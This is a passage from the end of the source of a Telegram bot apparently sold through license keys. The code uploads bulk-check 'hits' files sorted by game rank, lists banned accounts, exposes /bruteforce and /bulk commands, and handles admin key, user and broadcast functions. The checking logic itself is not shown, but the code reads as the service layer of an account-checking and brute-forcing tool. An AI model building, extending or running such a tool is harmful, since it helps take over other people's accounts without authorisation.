            f"Epic: {stats['rank_epic']} | Legend: {stats['rank_legend']}\n"
            f"Mythic+: {stats['rank_mythic']}"
        )
        
        await status_msg.edit_text(final_text, parse_mode=ParseMode.HTML)
        await upload_bulk_results(update, context, stats, session_files, session_id)
        
    except Exception as e:
        await status_msg.edit_text(f"❌ Error processing file: {str(e)}")


async def upload_bulk_results(update: Update, context: ContextTypes.DEFAULT_TYPE, stats: dict, session_files: dict, session_id: str):
    """Upload session-specific result files."""
    upload_msg = await update.message.reply_text(
        f"📤 <b>Uploading result files for job {session_id}...</b>",
        parse_mode=ParseMode.HTML
    )
    
    files_uploaded = []
    files_failed = []
    files_to_upload = []
    
    file_map = {
        "all_hits_detail": "all_hits_detail.txt",
        "raw_devices_detail": "raw_devices_detail.txt",
        "banned_accounts": "banned_accounts.txt",
        "v2l_active": "v2l_active.txt",
        "v2l_inactive": "v2l_inactive.txt",
        "sultan": "sultan.txt",
        "warrior": "warrior_hits.txt",
        "elite": "elite_hits.txt",
        "master": "master_hits.txt",
        "gm": "grandmaster_hits.txt",
        "epic": "epic_hits.txt",
        "legend": "legend_hits.txt",
        "mythic": "mythic_hits.txt",
    }
    
    for key, display_name in file_map.items():
        fpath = session_files.get(key)
        if fpath and os.path.exists(fpath) and os.path.getsize(fpath) > 0:
            files_to_upload.append((fpath, display_name))
    
    if not files_to_upload:
        await upload_msg.edit_text("✅ No result files to upload.", parse_mode=ParseMode.HTML)
        return
    
    for file_path, display_name in files_to_upload:
        try:
            file_size = os.path.getsize(file_path)
            size_str = f"{file_size/1024:.1f} KB" if file_size < 1024*1024 else f"{file_size/(1024*1024):.2f} MB"
            with open(file_path, 'rb') as f:
                await context.bot.send_document(
                    chat_id=update.message.chat_id,
                    document=InputFile(f, filename=display_name),
                    caption=f"📄 {display_name}\n📦 Size: {size_str}"
                )
            files_uploaded.append(display_name)
            await asyncio.sleep(0.3)
        except Exception as e:
            files_failed.append(f"{display_name}: {str(e)[:50]}")
    
    summary = (
        f"✅ <b>Bulk Check Complete!</b>\n"
        f"═══════════════════════════\n"
        f"🆔 Job ID: <code>{session_id}</code>\n"
        f"📊 Total: {stats['processed']:,}\n"
        f"🎯 Valid: {stats['hits']:,}\n"
    )
    if files_uploaded:
        summary += f"\n📄 <b>Uploaded Files ({len(files_uploaded)}):</b>\n"
        for fname in files_uploaded:
            summary += f"  • {fname}\n"
    if files_failed:
        summary += f"\n❌ <b>Failed:</b> {', '.join(files_failed)}"
    
    await upload_msg.edit_text(summary, parse_mode=ParseMode.HTML, reply_markup=main_menu_keyboard())

# ────────────────────────────────────────────────────────────────
# 27. ADMIN CONVERSATION HANDLERS
# ────────────────────────────────────────────────────────────────

async def handle_admin_delete_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    key_code = update.message.text.strip().upper()
    context.user_data.pop("admin_conv_state", None)
    if key_code.lower() == '/cancel':
        await update.message.reply_text("❌ Cancelled.", reply_markup=admin_panel_keyboard())
        return ConversationHandler.END
    
    if delete_key(key_code):
        await update.message.reply_text(
            f"✅ Key <code>{key_code}</code> deleted!",
            parse_mode=ParseMode.HTML,
            reply_markup=admin_panel_keyboard()
        )
    else:
        await update.message.reply_text(
            f"❌ Key not found!",
            parse_mode=ParseMode.HTML,
            reply_markup=admin_panel_keyboard()
        )
    return ConversationHandler.END

async def handle_admin_revoke(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if text.lower() == '/cancel':
        context.user_data.pop("admin_conv_state", None)
        await update.message.reply_text("❌ Cancelled.", reply_markup=admin_panel_keyboard())
        return ConversationHandler.END
    
    try:
        user_id = int(text)
    except:
        await update.message.reply_text("❌ Invalid User ID! Try again:")
        context.user_data["admin_conv_state"] = "revoke_user"
        return STATE_ADMIN_REVOKE_USER
    
    context.user_data.pop("admin_conv_state", None)
    if revoke_user_access(user_id):
        await update.message.reply_text(
            f"✅ User <code>{user_id}</code> revoked!",
            parse_mode=ParseMode.HTML,
            reply_markup=admin_panel_keyboard()
        )
    else:
        await update.message.reply_text(
            f"❌ User not found!",
            parse_mode=ParseMode.HTML,
            reply_markup=admin_panel_keyboard()
        )
    return ConversationHandler.END

async def handle_admin_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    context.user_data.pop("admin_conv_state", None)
    if text.lower() == '/cancel':
        await update.message.reply_text("❌ Cancelled.", reply_markup=admin_panel_keyboard())
        return ConversationHandler.END
    
    users = list_all_users()
    sent = 0
    failed = 0
    for u in users:
        if u.get("status") == "active":
            try:
                await context.bot.send_message(
                    chat_id=u["user_id"],
                    text=f"📢 <b>BROADCAST</b>\n═══════════════════════════\n\n{escape_html(text)}",
                    parse_mode=ParseMode.HTML
                )
                sent += 1
            except:
                failed += 1
            await asyncio.sleep(0.05)
    
    await update.message.reply_text(
        f"✅ <b>Broadcast Complete!</b>\nSent: {sent} | Failed: {failed}",
        parse_mode=ParseMode.HTML,
        reply_markup=admin_panel_keyboard()
    )
    return ConversationHandler.END

async def handle_admin_adduser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if text.lower() == '/cancel':
        context.user_data.pop("admin_conv_state", None)
        await update.message.reply_text("❌ Cancelled.", reply_markup=admin_panel_keyboard())
        return ConversationHandler.END
    
    try:
        target_id = int(text)
    except:
        await update.message.reply_text("❌ Invalid User ID! Try again:")
        context.user_data["admin_conv_state"] = "add_user"
        return STATE_ADMIN_ADDUSER_ID
    
    context.user_data.pop("admin_conv_state", None)
    
    key_data = create_key(0, 1, f"admin_manual_{update.effective_user.id}")
    now = datetime.now(TZ_WIB)
    
    with USERS_LOCK:
        users_db = load_json(USERS_FILE)
        users_db[str(target_id)] = {
            "user_id": target_id,
            "username": f"Manual_{target_id}",
            "key": key_data["key"],
            "activated_at": now.isoformat(),
            "expires_at": None,
            "duration_days": 0,
            "status": "active"
        }
        save_json(USERS_FILE, users_db)
    
    with KEYS_LOCK:
        keys_db = load_json(KEYS_FILE)
        keys_db[key_data["key"]]["uses"] = 1
        keys_db[key_data["key"]]["status"] = "used"
        keys_db[key_data["key"]]["activated_by"].append({
            "user_id": target_id, "username": f"Manual_{target_id}",
            "activated_at": now.isoformat()
        })
        save_json(KEYS_FILE, keys_db)
    
    await update.message.reply_text(
        f"✅ <b>User Added!</b>\n"
        f"🆔 User ID: <code>{target_id}</code>\n"
        f"♾️ Access: Lifetime",
        parse_mode=ParseMode.HTML,
        reply_markup=admin_panel_keyboard()
    )
    return ConversationHandler.END

# ────────────────────────────────────────────────────────────────
# 28. MAIN
# ────────────────────────────────────────────────────────────────

def main():
    print("=" * 60)
    print("🤖 PREMIUM DEVICE ID BOT V2.0")
    print("👑 Created by: @ZyronDevv")
    print("=" * 60)
    print(f"📁 Output Dir: {OUTPUT_DIR}")
    print(f"🔑 Keys File: {KEYS_FILE}")
    print(f"👥 Users File: {USERS_FILE}")
    print(f"⚡ BF Limits File: {BF_LIMITS_FILE}")
    print(f"📊 Bulk Jobs File: {BULK_JOBS_FILE}")
    print(f"🛡️ Admin IDs: {ADMIN_IDS}")
    print("=" * 60)
    print("🚀 Starting bot...")
    
    if not os.path.exists(KEYS_FILE):
        save_json(KEYS_FILE, {})
    if not os.path.exists(USERS_FILE):
        save_json(USERS_FILE, {})
    if not os.path.exists(BF_LIMITS_FILE):
        save_json(BF_LIMITS_FILE, {"device_limit": 1, "users": {}, "user_overrides": {}})
    if not os.path.exists(BULK_JOBS_FILE):
        save_json(BULK_JOBS_FILE, {})
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # ─── COMMANDS ───
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("about", cmd_about))
    app.add_handler(CommandHandler("single", cmd_single))
    app.add_handler(CommandHandler("bulk", cmd_bulk))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("cancel", cmd_cancel))
    app.add_handler(CommandHandler("redeem", cmd_redeem))
    app.add_handler(CommandHandler("mykey", cmd_mykey))
    app.add_handler(CommandHandler("bruteforce", cmd_bruteforce))
    app.add_handler(CommandHandler("bfstop", cmd_bfstop))
    app.add_handler(CommandHandler("bfstatus", cmd_bfstatus))
    
    # ─── CALLBACKS ───
    app.add_handler(CallbackQueryHandler(callback_handler))
    
    # ─── DOCUMENT HANDLER (must come before conversation handler) ───
    app.add_handler(MessageHandler(filters.Document.ALL, handle_bulk_file))
    
    # ─── CONVERSATION HANDLER ───
    conv_handler = ConversationHandler(
        entry_points=[
            MessageHandler(filters.TEXT & ~filters.COMMAND, _conversation_router),
        ],
        states={
            STATE_BF_CUSTOM_LOOPS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_bf_custom_loops)
            ],
            STATE_BF_CUSTOM_DELAY: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_bf_custom_delay)
            ],
            STATE_ADMIN_DELETE_KEY: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_admin_delete_key)
            ],
            STATE_ADMIN_REVOKE_USER: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_admin_revoke)
            ],
            STATE_ADMIN_BROADCAST: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_admin_broadcast)
            ],
            STATE_ADMIN_ADDUSER_ID: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_admin_adduser)
            ],
        },
        fallbacks=[CommandHandler("cancel", cmd_cancel)],
        per_user=True,
        per_chat=True,
        per_message=True,
        allow_reentry=True,
    )
    app.add_handler(conv_handler)
    
    # ─── UNIFIED TEXT HANDLER ───
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_all_text_input))
    
    print("✅ Bot is running! Press Ctrl+C to stop.")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n⚠️ Bot stopped by user.")
    except Exception as e:
        print(f"\n❌ Error: {e}")
        import traceback
        traceback.print_exc()
